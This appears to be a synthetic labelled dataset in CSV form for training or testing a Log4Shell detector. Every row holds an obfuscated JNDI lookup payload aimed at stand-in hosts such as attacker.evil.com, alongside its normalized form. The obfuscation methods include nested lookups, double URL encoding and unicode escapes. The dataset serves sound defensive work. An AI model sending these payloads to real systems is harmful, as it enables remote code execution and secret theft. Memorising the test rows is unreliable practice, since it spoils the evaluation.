id,timestamp,source,raw_log,normalized_log,label,attack_family,obfuscation_type,field,split,risk_level
LS-000328,2026-05-17,synthetic,Request from User-Agent: ${${env:AWS_SECRET_ACCESS_KEY:-j}${env:AWS_SECRET_ACCESS_KEY:-n}${env:AWS_SECRET_ACCESS_KEY:-d}${env:AWS_SECRET_ACCESS_KEY:-i}:ldap://attacker.evil.com/env},request from user-agent: ${jndi:ldap://attacker.evil.com/env},1,log4shell,nested_lookup_env_fallback,user_agent_minimal,unseen_obfuscation_test,critical
LS-000329,2026-05-17,synthetic,Request from User-Agent: Mozilla/5.0 Chrome/120.0 | Method: GET | Host: app.local | Path: /static/app.js | X-Api-Version: ${${env:AWS_SECRET_ACCESS_KEY:-j}${env:AWS_SECRET_ACCESS_KEY:-n}${env:AWS_SECRET_ACCESS_KEY:-d}${env:AWS_SECRET_ACCESS_KEY:-i}:ldap://attacker.evil.com/env},request from user-agent: mozilla/5.0 chrome/120.0 | method: get | host: app.local | path: /static/app.js | x-api-version: ${jndi:ldap://attacker.evil.com/env},1,log4shell,nested_lookup_env_fallback,x_api_version,unseen_obfuscation_test,critical
LS-000330,2026-05-17,synthetic,GET /search?q=${${env:AWS_SECRET_ACCESS_KEY:-j}${env:AWS_SECRET_ACCESS_KEY:-n}${env:AWS_SECRET_ACCESS_KEY:-d}${env:AWS_SECRET_ACCESS_KEY:-i}:ldap://attacker.evil.com/env} HTTP/1.1 Host: app.local User-Agent: curl/7.88.1,get /search?q=${jndi:ldap://attacker.evil.com/env} http/1.1 host: app.local user-agent: curl/7.88.1,1,log4shell,nested_lookup_env_fallback,path,unseen_obfuscation_test,critical
LS-000331,2026-05-17,synthetic,POST /search HTTP/1.1 Host: app.local Body: query=${${env:AWS_SECRET_ACCESS_KEY:-j}${env:AWS_SECRET_ACCESS_KEY:-n}${env:AWS_SECRET_ACCESS_KEY:-d}${env:AWS_SECRET_ACCESS_KEY:-i}:ldap://attacker.evil.com/env},post /search http/1.1 host: app.local body: query=${jndi:ldap://attacker.evil.com/env},1,log4shell,nested_lookup_env_fallback,body,unseen_obfuscation_test,critical
LS-000332,2026-05-17,synthetic,GET /?q=${${env:AWS_SECRET_ACCESS_KEY:-j}${env:AWS_SECRET_ACCESS_KEY:-n}${env:AWS_SECRET_ACCESS_KEY:-d}${env:AWS_SECRET_ACCESS_KEY:-i}:ldap://attacker.evil.com/env} HTTP/1.1,get /?q=${jndi:ldap://attacker.evil.com/env} http/1.1,1,log4shell,nested_lookup_env_fallback,minimal_query,unseen_obfuscation_test,critical
LS-000333,2026-05-17,synthetic,GET /api/check?debug=${${env:AWS_SECRET_ACCESS_KEY:-j}${env:AWS_SECRET_ACCESS_KEY:-n}${env:AWS_SECRET_ACCESS_KEY:-d}${env:AWS_SECRET_ACCESS_KEY:-i}:ldap://attacker.evil.com/env} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://attacker.evil.com/env} http/1.1 host: app.local,1,log4shell,nested_lookup_env_fallback,uri_param,unseen_obfuscation_test,critical
LS-000334,2026-05-17,synthetic,Request from User-Agent: ${${env:AWS_SECRET_ACCESS_KEY:-j}${env:AWS_SECRET_ACCESS_KEY:-n}${env:AWS_SECRET_ACCESS_KEY:-d}${env:AWS_SECRET_ACCESS_KEY:-i}:ldap://attacker.evil.com/env} | Method: GET | Host: app.local | Path: /search?q=boots,request from user-agent: ${jndi:ldap://attacker.evil.com/env} | method: get | host: app.local | path: /search?q=boots,1,log4shell,nested_lookup_env_fallback,user_agent,unseen_obfuscation_test,critical
LS-000335,2026-05-17,synthetic,Request from User-Agent: ${${env:AWS_SECRET_ACCESS_KEY:-j}${env:AWS_SECRET_ACCESS_KEY:-n}${env:AWS_SECRET_ACCESS_KEY:-d}${env:AWS_SECRET_ACCESS_KEY:-i}:ldap://attacker.evil.com/env},request from user-agent: ${jndi:ldap://attacker.evil.com/env},1,log4shell,nested_lookup_env_fallback,user_agent_minimal,unseen_obfuscation_test,critical
LS-000336,2026-05-17,synthetic,Request from User-Agent: python-requests/2.31.0 | Method: GET | Host: app.local | Path: /static/app.js | X-Api-Version: ${${env:AWS_SECRET_ACCESS_KEY:-j}${env:AWS_SECRET_ACCESS_KEY:-n}${env:AWS_SECRET_ACCESS_KEY:-d}${env:AWS_SECRET_ACCESS_KEY:-i}:ldap://attacker.evil.com/env},request from user-agent: python-requests/2.31.0 | method: get | host: app.local | path: /static/app.js | x-api-version: ${jndi:ldap://attacker.evil.com/env},1,log4shell,nested_lookup_env_fallback,x_api_version,unseen_obfuscation_test,critical
LS-000337,2026-05-17,synthetic,GET /?q=${${::-j}${::-n}${::-d}${::-i}:ldap://attacker.evil.com/frag} HTTP/1.1,get /?q=${jndi:ldap://attacker.evil.com/frag} http/1.1,1,log4shell,nested_lookup_env_fallback_fragmented_tokens,minimal_query,unseen_obfuscation_test,critical
LS-000338,2026-05-17,synthetic,GET /api/check?debug=${${::-j}${::-n}${::-d}${::-i}:ldap://attacker.evil.com/frag} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://attacker.evil.com/frag} http/1.1 host: app.local,1,log4shell,nested_lookup_env_fallback_fragmented_tokens,uri_param,unseen_obfuscation_test,critical
LS-000339,2026-05-17,synthetic,Request from User-Agent: ${${::-j}${::-n}${::-d}${::-i}:ldap://attacker.evil.com/frag} | Method: GET | Host: app.local | Path: /search?q=boots,request from user-agent: ${jndi:ldap://attacker.evil.com/frag} | method: get | host: app.local | path: /search?q=boots,1,log4shell,nested_lookup_env_fallback_fragmented_tokens,user_agent,unseen_obfuscation_test,critical
LS-000340,2026-05-17,synthetic,Request from User-Agent: ${${::-j}${::-n}${::-d}${::-i}:ldap://attacker.evil.com/frag},request from user-agent: ${jndi:ldap://attacker.evil.com/frag},1,log4shell,nested_lookup_env_fallback_fragmented_tokens,user_agent_minimal,unseen_obfuscation_test,critical
LS-000341,2026-05-17,synthetic,Request from User-Agent: PostmanRuntime/7.36.1 | Method: GET | Host: app.local | Path: /metrics | X-Api-Version: ${${::-j}${::-n}${::-d}${::-i}:ldap://attacker.evil.com/frag},request from user-agent: postmanruntime/7.36.1 | method: get | host: app.local | path: /metrics | x-api-version: ${jndi:ldap://attacker.evil.com/frag},1,log4shell,nested_lookup_env_fallback_fragmented_tokens,x_api_version,unseen_obfuscation_test,critical
LS-000342,2026-05-17,synthetic,GET /search?q=${${::-j}${::-n}${::-d}${::-i}:ldap://attacker.evil.com/frag} HTTP/1.1 Host: app.local User-Agent: Mozilla/5.0 Chrome/120.0,get /search?q=${jndi:ldap://attacker.evil.com/frag} http/1.1 host: app.local user-agent: mozilla/5.0 chrome/120.0,1,log4shell,nested_lookup_env_fallback_fragmented_tokens,path,unseen_obfuscation_test,critical
LS-000343,2026-05-17,synthetic,POST /search HTTP/1.1 Host: app.local Body: query=${${::-j}${::-n}${::-d}${::-i}:ldap://attacker.evil.com/frag},post /search http/1.1 host: app.local body: query=${jndi:ldap://attacker.evil.com/frag},1,log4shell,nested_lookup_env_fallback_fragmented_tokens,body,unseen_obfuscation_test,critical
LS-000344,2026-05-17,synthetic,GET /?q=${${::-j}${::-n}${::-d}${::-i}:ldap://attacker.evil.com/frag} HTTP/1.1,get /?q=${jndi:ldap://attacker.evil.com/frag} http/1.1,1,log4shell,nested_lookup_env_fallback_fragmented_tokens,minimal_query,unseen_obfuscation_test,critical
LS-000345,2026-05-17,synthetic,GET /api/check?debug=${${::-j}${::-n}${::-d}${::-i}:ldap://attacker.evil.com/frag} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://attacker.evil.com/frag} http/1.1 host: app.local,1,log4shell,nested_lookup_env_fallback_fragmented_tokens,uri_param,unseen_obfuscation_test,critical
LS-000346,2026-05-17,synthetic,Request from User-Agent: ${${::-j}${::-n}${::-d}${::-i}:ldap://attacker.evil.com/frag} | Method: GET | Host: app.local | Path: /api/products?id=123,request from user-agent: ${jndi:ldap://attacker.evil.com/frag} | method: get | host: app.local | path: /api/products?id=123,1,log4shell,nested_lookup_env_fallback_fragmented_tokens,user_agent,unseen_obfuscation_test,critical
LS-000347,2026-05-17,synthetic,Request from User-Agent: ${${::-j}${::-n}${::-d}${::-i}:ldap://attacker.evil.com/frag},request from user-agent: ${jndi:ldap://attacker.evil.com/frag},1,log4shell,nested_lookup_env_fallback_fragmented_tokens,user_agent_minimal,unseen_obfuscation_test,critical
LS-000348,2026-05-17,synthetic,Request from User-Agent: python-requests/2.31.0 | Method: GET | Host: app.local | Path: /static/app.js | X-Api-Version: ${${::-j}${::-n}${::-d}${::-i}:ldap://attacker.evil.com/frag},request from user-agent: python-requests/2.31.0 | method: get | host: app.local | path: /static/app.js | x-api-version: ${jndi:ldap://attacker.evil.com/frag},1,log4shell,nested_lookup_env_fallback_fragmented_tokens,x_api_version,unseen_obfuscation_test,critical
LS-000349,2026-05-17,synthetic,GET /?q=%2524%257Bjndi%253Aldap%253A%252F%252Fattacker.evil.com%252Fdouble%257D HTTP/1.1,get /?q=${jndi:ldap://attacker.evil.com/double} http/1.1,1,log4shell,double_url_encoded,minimal_query,unseen_obfuscation_test,critical
LS-000350,2026-05-17,synthetic,GET /api/check?debug=%2524%257Bjndi%253Aldap%253A%252F%252Fattacker.evil.com%252Fdouble%257D HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://attacker.evil.com/double} http/1.1 host: app.local,1,log4shell,double_url_encoded,uri_param,unseen_obfuscation_test,critical
LS-000351,2026-05-17,synthetic,Request from User-Agent: %2524%257Bjndi%253Aldap%253A%252F%252Fattacker.evil.com%252Fdouble%257D | Method: GET | Host: app.local | Path: /static/app.js,request from user-agent: ${jndi:ldap://attacker.evil.com/double} | method: get | host: app.local | path: /static/app.js,1,log4shell,double_url_encoded,user_agent,unseen_obfuscation_test,critical
LS-000352,2026-05-17,synthetic,Request from User-Agent: %2524%257Bjndi%253Aldap%253A%252F%252Fattacker.evil.com%252Fdouble%257D,request from user-agent: ${jndi:ldap://attacker.evil.com/double},1,log4shell,double_url_encoded,user_agent_minimal,unseen_obfuscation_test,critical
LS-000353,2026-05-17,synthetic,Request from User-Agent: Mozilla/5.0 Chrome/120.0 | Method: GET | Host: app.local | Path: /api/products?id=123 | X-Api-Version: %2524%257Bjndi%253Aldap%253A%252F%252Fattacker.evil.com%252Fdouble%257D,request from user-agent: mozilla/5.0 chrome/120.0 | method: get | host: app.local | path: /api/products?id=123 | x-api-version: ${jndi:ldap://attacker.evil.com/double},1,log4shell,double_url_encoded,x_api_version,unseen_obfuscation_test,critical
LS-000354,2026-05-17,synthetic,GET /search?q=%2524%257Bjndi%253Aldap%253A%252F%252Fattacker.evil.com%252Fdouble%257D HTTP/1.1 Host: app.local User-Agent: PostmanRuntime/7.36.1,get /search?q=${jndi:ldap://attacker.evil.com/double} http/1.1 host: app.local user-agent: postmanruntime/7.36.1,1,log4shell,double_url_encoded,path,unseen_obfuscation_test,critical
LS-000355,2026-05-17,synthetic,POST /search HTTP/1.1 Host: app.local Body: query=%2524%257Bjndi%253Aldap%253A%252F%252Fattacker.evil.com%252Fdouble%257D,post /search http/1.1 host: app.local body: query=${jndi:ldap://attacker.evil.com/double},1,log4shell,double_url_encoded,body,unseen_obfuscation_test,critical
LS-000356,2026-05-17,synthetic,GET /?q=%2524%257Bjndi%253Aldap%253A%252F%252Fattacker.evil.com%252Fdouble%257D HTTP/1.1,get /?q=${jndi:ldap://attacker.evil.com/double} http/1.1,1,log4shell,double_url_encoded,minimal_query,unseen_obfuscation_test,critical
LS-000357,2026-05-17,synthetic,GET /api/check?debug=%2524%257Bjndi%253Aldap%253A%252F%252Fattacker.evil.com%252Fdouble%257D HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://attacker.evil.com/double} http/1.1 host: app.local,1,log4shell,double_url_encoded,uri_param,unseen_obfuscation_test,critical
LS-000358,2026-05-17,synthetic,Request from User-Agent: %2524%257Bjndi%253Aldap%253A%252F%252Fattacker.evil.com%252Fdouble%257D | Method: GET | Host: app.local | Path: /static/app.js,request from user-agent: ${jndi:ldap://attacker.evil.com/double} | method: get | host: app.local | path: /static/app.js,1,log4shell,double_url_encoded,user_agent,unseen_obfuscation_test,critical
LS-000359,2026-05-17,synthetic,Request from User-Agent: %2524%257Bjndi%253Aldap%253A%252F%252Fattacker.evil.com%252Fdouble%257D,request from user-agent: ${jndi:ldap://attacker.evil.com/double},1,log4shell,double_url_encoded,user_agent_minimal,unseen_obfuscation_test,critical
LS-000360,2026-05-17,synthetic,Request from User-Agent: Go-http-client/1.1 | Method: GET | Host: app.local | Path: /home | X-Api-Version: %2524%257Bjndi%253Aldap%253A%252F%252Fattacker.evil.com%252Fdouble%257D,request from user-agent: go-http-client/1.1 | method: get | host: app.local | path: /home | x-api-version: ${jndi:ldap://attacker.evil.com/double},1,log4shell,double_url_encoded,x_api_version,unseen_obfuscation_test,critical
LS-000361,2026-05-17,synthetic,GET /?q=${\u006a\u006e\u0064\u0069:ldap://attacker.evil.com/unicode} HTTP/1.1,get /?q=${jndi:ldap://attacker.evil.com/unicode} http/1.1,1,log4shell,unicode_escape,minimal_query,unseen_obfuscation_test,critical
LS-000362,2026-05-17,synthetic,GET /api/check?debug=${\u006a\u006e\u0064\u0069:ldap://attacker.evil.com/unicode} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://attacker.evil.com/unicode} http/1.1 host: app.local,1,log4shell,unicode_escape,uri_param,unseen_obfuscation_test,critical
LS-000363,2026-05-17,synthetic,Request from User-Agent: ${\u006a\u006e\u0064\u0069:ldap://attacker.evil.com/unicode} | Method: GET | Host: app.local | Path: /search?q=boots,request from user-agent: ${jndi:ldap://attacker.evil.com/unicode} | method: get | host: app.local | path: /search?q=boots,1,log4shell,unicode_escape,user_agent,unseen_obfuscation_test,critical
LS-000364,2026-05-17,synthetic,Request from User-Agent: ${\u006a\u006e\u0064\u0069:ldap://attacker.evil.com/unicode},request from user-agent: ${jndi:ldap://attacker.evil.com/unicode},1,log4shell,unicode_escape,user_agent_minimal,unseen_obfuscation_test,critical
LS-000365,2026-05-17,synthetic,Request from User-Agent: Mozilla/5.0 Chrome/120.0 | Method: GET | Host: app.local | Path: /login | X-Api-Version: ${\u006a\u006e\u0064\u0069:ldap://attacker.evil.com/unicode},request from user-agent: mozilla/5.0 chrome/120.0 | method: get | host: app.local | path: /login | x-api-version: ${jndi:ldap://attacker.evil.com/unicode},1,log4shell,unicode_escape,x_api_version,unseen_obfuscation_test,critical
LS-000366,2026-05-17,synthetic,GET /search?q=${\u006a\u006e\u0064\u0069:ldap://attacker.evil.com/unicode} HTTP/1.1 Host: app.local User-Agent: python-requests/2.31.0,get /search?q=${jndi:ldap://attacker.evil.com/unicode} http/1.1 host: app.local user-agent: python-requests/2.31.0,1,log4shell,unicode_escape,path,unseen_obfuscation_test,critical
LS-000367,2026-05-17,synthetic,POST /search HTTP/1.1 Host: app.local Body: query=${\u006a\u006e\u0064\u0069:ldap://attacker.evil.com/unicode},post /search http/1.1 host: app.local body: query=${jndi:ldap://attacker.evil.com/unicode},1,log4shell,unicode_escape,body,unseen_obfuscation_test,critical
LS-000368,2026-05-17,synthetic,GET /?q=${\u006a\u006e\u0064\u0069:ldap://attacker.evil.com/unicode} HTTP/1.1,get /?q=${jndi:ldap://attacker.evil.com/unicode} http/1.1,1,log4shell,unicode_escape,minimal_query,unseen_obfuscation_test,critical
LS-000369,2026-05-17,synthetic,GET /api/check?debug=${\u006a\u006e\u0064\u0069:ldap://attacker.evil.com/unicode} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://attacker.evil.com/unicode} http/1.1 host: app.local,1,log4shell,unicode_escape,uri_param,unseen_obfuscation_test,critical
LS-000370,2026-05-17,synthetic,Request from User-Agent: ${\u006a\u006e\u0064\u0069:ldap://attacker.evil.com/unicode} | Method: GET | Host: app.local | Path: /home,request from user-agent: ${jndi:ldap://attacker.evil.com/unicode} | method: get | host: app.local | path: /home,1,log4shell,unicode_escape,user_agent,unseen_obfuscation_test,critical
LS-000371,2026-05-17,synthetic,Request from User-Agent: ${\u006a\u006e\u0064\u0069:ldap://attacker.evil.com/unicode},request from user-agent: ${jndi:ldap://attacker.evil.com/unicode},1,log4shell,unicode_escape,user_agent_minimal,unseen_obfuscation_test,critical
LS-000372,2026-05-17,synthetic,Request from User-Agent: Java/11.0.13 | Method: GET | Host: app.local | Path: / | X-Api-Version: ${\u006a\u006e\u0064\u0069:ldap://attacker.evil.com/unicode},request from user-agent: java/11.0.13 | method: get | host: app.local | path: / | x-api-version: ${jndi:ldap://attacker.evil.com/unicode},1,log4shell,unicode_escape,x_api_version,unseen_obfuscation_test,critical
LS-000373,2026-05-17,synthetic,GET /?q=${j${::-n}d${::-i}:l${::-d}ap://attacker.evil.com/sep} HTTP/1.1,get /?q=${jndi:ldap://attacker.evil.com/sep} http/1.1,1,log4shell,nested_lookup_env_fallback_fragmented_tokens,minimal_query,unseen_obfuscation_test,critical
LS-000374,2026-05-17,synthetic,GET /api/check?debug=${j${::-n}d${::-i}:l${::-d}ap://attacker.evil.com/sep} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://attacker.evil.com/sep} http/1.1 host: app.local,1,log4shell,nested_lookup_env_fallback_fragmented_tokens,uri_param,unseen_obfuscation_test,critical
LS-000375,2026-05-17,synthetic,Request from User-Agent: ${j${::-n}d${::-i}:l${::-d}ap://attacker.evil.com/sep} | Method: GET | Host: app.local | Path: /login,request from user-agent: ${jndi:ldap://attacker.evil.com/sep} | method: get | host: app.local | path: /login,1,log4shell,nested_lookup_env_fallback_fragmented_tokens,user_agent,unseen_obfuscation_test,critical
LS-000376,2026-05-17,synthetic,Request from User-Agent: ${j${::-n}d${::-i}:l${::-d}ap://attacker.evil.com/sep},request from user-agent: ${jndi:ldap://attacker.evil.com/sep},1,log4shell,nested_lookup_env_fallback_fragmented_tokens,user_agent_minimal,unseen_obfuscation_test,critical
LS-000377,2026-05-17,synthetic,Request from User-Agent: Go-http-client/1.1 | Method: GET | Host: app.local | Path: /static/app.js | X-Api-Version: ${j${::-n}d${::-i}:l${::-d}ap://attacker.evil.com/sep},request from user-agent: go-http-client/1.1 | method: get | host: app.local | path: /static/app.js | x-api-version: ${jndi:ldap://attacker.evil.com/sep},1,log4shell,nested_lookup_env_fallback_fragmented_tokens,x_api_version,unseen_obfuscation_test,critical
LS-000378,2026-05-17,synthetic,GET /search?q=${j${::-n}d${::-i}:l${::-d}ap://attacker.evil.com/sep} HTTP/1.1 Host: app.local User-Agent: PostmanRuntime/7.36.1,get /search?q=${jndi:ldap://attacker.evil.com/sep} http/1.1 host: app.local user-agent: postmanruntime/7.36.1,1,log4shell,nested_lookup_env_fallback_fragmented_tokens,path,unseen_obfuscation_test,critical
LS-000379,2026-05-17,synthetic,POST /search HTTP/1.1 Host: app.local Body: query=${j${::-n}d${::-i}:l${::-d}ap://attacker.evil.com/sep},post /search http/1.1 host: app.local body: query=${jndi:ldap://attacker.evil.com/sep},1,log4shell,nested_lookup_env_fallback_fragmented_tokens,body,unseen_obfuscation_test,critical
LS-000380,2026-05-17,synthetic,GET /?q=${j${::-n}d${::-i}:l${::-d}ap://attacker.evil.com/sep} HTTP/1.1,get /?q=${jndi:ldap://attacker.evil.com/sep} http/1.1,1,log4shell,nested_lookup_env_fallback_fragmented_tokens,minimal_query,unseen_obfuscation_test,critical
LS-000381,2026-05-17,synthetic,GET /api/check?debug=${j${::-n}d${::-i}:l${::-d}ap://attacker.evil.com/sep} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://attacker.evil.com/sep} http/1.1 host: app.local,1,log4shell,nested_lookup_env_fallback_fragmented_tokens,uri_param,unseen_obfuscation_test,critical
LS-000382,2026-05-17,synthetic,Request from User-Agent: ${j${::-n}d${::-i}:l${::-d}ap://attacker.evil.com/sep} | Method: GET | Host: app.local | Path: /metrics,request from user-agent: ${jndi:ldap://attacker.evil.com/sep} | method: get | host: app.local | path: /metrics,1,log4shell,nested_lookup_env_fallback_fragmented_tokens,user_agent,unseen_obfuscation_test,critical
LS-000383,2026-05-17,synthetic,Request from User-Agent: ${j${::-n}d${::-i}:l${::-d}ap://attacker.evil.com/sep},request from user-agent: ${jndi:ldap://attacker.evil.com/sep},1,log4shell,nested_lookup_env_fallback_fragmented_tokens,user_agent_minimal,unseen_obfuscation_test,critical
LS-000384,2026-05-17,synthetic,Request from User-Agent: PostmanRuntime/7.36.1 | Method: GET | Host: app.local | Path: /search?q=boots | X-Api-Version: ${j${::-n}d${::-i}:l${::-d}ap://attacker.evil.com/sep},request from user-agent: postmanruntime/7.36.1 | method: get | host: app.local | path: /search?q=boots | x-api-version: ${jndi:ldap://attacker.evil.com/sep},1,log4shell,nested_lookup_env_fallback_fragmented_tokens,x_api_version,unseen_obfuscation_test,critical
LS-000493,2026-05-17,synthetic,GET /?q=${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://log4j-test.invalid/nested} HTTP/1.1,get /?q=${jndi:ldap://log4j-test.invalid/nested} http/1.1,1,log4shell,nested_lookup_lower_upper_lookup,minimal_query,unseen_obfuscation_test,critical
LS-000494,2026-05-17,synthetic,GET /api/check?debug=${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://log4j-test.invalid/nested} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://log4j-test.invalid/nested} http/1.1 host: app.local,1,log4shell,nested_lookup_lower_upper_lookup,uri_param,unseen_obfuscation_test,critical
LS-000495,2026-05-17,synthetic,Request from User-Agent: ${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://log4j-test.invalid/nested} | Method: GET | Host: app.local | Path: /static/app.js,request from user-agent: ${jndi:ldap://log4j-test.invalid/nested} | method: get | host: app.local | path: /static/app.js,1,log4shell,nested_lookup_lower_upper_lookup,user_agent,unseen_obfuscation_test,critical
LS-000496,2026-05-17,synthetic,Request from User-Agent: ${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://log4j-test.invalid/nested},request from user-agent: ${jndi:ldap://log4j-test.invalid/nested},1,log4shell,nested_lookup_lower_upper_lookup,user_agent_minimal,unseen_obfuscation_test,critical
LS-000497,2026-05-17,synthetic,Request from User-Agent: Java/11.0.13 | Method: GET | Host: app.local | Path: /home | X-Api-Version: ${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://log4j-test.invalid/nested},request from user-agent: java/11.0.13 | method: get | host: app.local | path: /home | x-api-version: ${jndi:ldap://log4j-test.invalid/nested},1,log4shell,nested_lookup_lower_upper_lookup,x_api_version,unseen_obfuscation_test,critical
LS-000498,2026-05-17,synthetic,GET /search?q=${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://log4j-test.invalid/nested} HTTP/1.1 Host: app.local User-Agent: python-requests/2.31.0,get /search?q=${jndi:ldap://log4j-test.invalid/nested} http/1.1 host: app.local user-agent: python-requests/2.31.0,1,log4shell,nested_lookup_lower_upper_lookup,path,unseen_obfuscation_test,critical
LS-000499,2026-05-17,synthetic,POST /search HTTP/1.1 Host: app.local Body: query=${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://log4j-test.invalid/nested},post /search http/1.1 host: app.local body: query=${jndi:ldap://log4j-test.invalid/nested},1,log4shell,nested_lookup_lower_upper_lookup,body,unseen_obfuscation_test,critical
LS-000500,2026-05-17,synthetic,GET /?q=${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://log4j-test.invalid/nested} HTTP/1.1,get /?q=${jndi:ldap://log4j-test.invalid/nested} http/1.1,1,log4shell,nested_lookup_lower_upper_lookup,minimal_query,unseen_obfuscation_test,critical
LS-000501,2026-05-17,synthetic,GET /api/check?debug=${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://log4j-test.invalid/nested} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://log4j-test.invalid/nested} http/1.1 host: app.local,1,log4shell,nested_lookup_lower_upper_lookup,uri_param,unseen_obfuscation_test,critical
LS-000502,2026-05-17,synthetic,Request from User-Agent: ${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://log4j-test.invalid/nested} | Method: GET | Host: app.local | Path: /metrics,request from user-agent: ${jndi:ldap://log4j-test.invalid/nested} | method: get | host: app.local | path: /metrics,1,log4shell,nested_lookup_lower_upper_lookup,user_agent,unseen_obfuscation_test,critical
LS-000503,2026-05-17,synthetic,Request from User-Agent: ${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://log4j-test.invalid/nested},request from user-agent: ${jndi:ldap://log4j-test.invalid/nested},1,log4shell,nested_lookup_lower_upper_lookup,user_agent_minimal,unseen_obfuscation_test,critical
LS-000504,2026-05-17,synthetic,Request from User-Agent: python-requests/2.31.0 | Method: GET | Host: app.local | Path: /metrics | X-Api-Version: ${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://log4j-test.invalid/nested},request from user-agent: python-requests/2.31.0 | method: get | host: app.local | path: /metrics | x-api-version: ${jndi:ldap://log4j-test.invalid/nested},1,log4shell,nested_lookup_lower_upper_lookup,x_api_version,unseen_obfuscation_test,critical
LS-000505,2026-05-17,synthetic,GET /?q=${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://log4j-test.invalid/lower} HTTP/1.1,get /?q=${jndi:ldap://log4j-test.invalid/lower} http/1.1,1,log4shell,nested_lookup_lower_upper_lookup,minimal_query,unseen_obfuscation_test,critical
LS-000506,2026-05-17,synthetic,GET /api/check?debug=${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://log4j-test.invalid/lower} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://log4j-test.invalid/lower} http/1.1 host: app.local,1,log4shell,nested_lookup_lower_upper_lookup,uri_param,unseen_obfuscation_test,critical
LS-000507,2026-05-17,synthetic,Request from User-Agent: ${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://log4j-test.invalid/lower} | Method: GET | Host: app.local | Path: /home,request from user-agent: ${jndi:ldap://log4j-test.invalid/lower} | method: get | host: app.local | path: /home,1,log4shell,nested_lookup_lower_upper_lookup,user_agent,unseen_obfuscation_test,critical
LS-000508,2026-05-17,synthetic,Request from User-Agent: ${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://log4j-test.invalid/lower},request from user-agent: ${jndi:ldap://log4j-test.invalid/lower},1,log4shell,nested_lookup_lower_upper_lookup,user_agent_minimal,unseen_obfuscation_test,critical
LS-000509,2026-05-17,synthetic,Request from User-Agent: curl/7.88.1 | Method: GET | Host: app.local | Path: /login | X-Api-Version: ${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://log4j-test.invalid/lower},request from user-agent: curl/7.88.1 | method: get | host: app.local | path: /login | x-api-version: ${jndi:ldap://log4j-test.invalid/lower},1,log4shell,nested_lookup_lower_upper_lookup,x_api_version,unseen_obfuscation_test,critical
LS-000510,2026-05-17,synthetic,GET /search?q=${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://log4j-test.invalid/lower} HTTP/1.1 Host: app.local User-Agent: Mozilla/5.0 Safari/605.1.15,get /search?q=${jndi:ldap://log4j-test.invalid/lower} http/1.1 host: app.local user-agent: mozilla/5.0 safari/605.1.15,1,log4shell,nested_lookup_lower_upper_lookup,path,unseen_obfuscation_test,critical
LS-000511,2026-05-17,synthetic,POST /search HTTP/1.1 Host: app.local Body: query=${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://log4j-test.invalid/lower},post /search http/1.1 host: app.local body: query=${jndi:ldap://log4j-test.invalid/lower},1,log4shell,nested_lookup_lower_upper_lookup,body,unseen_obfuscation_test,critical
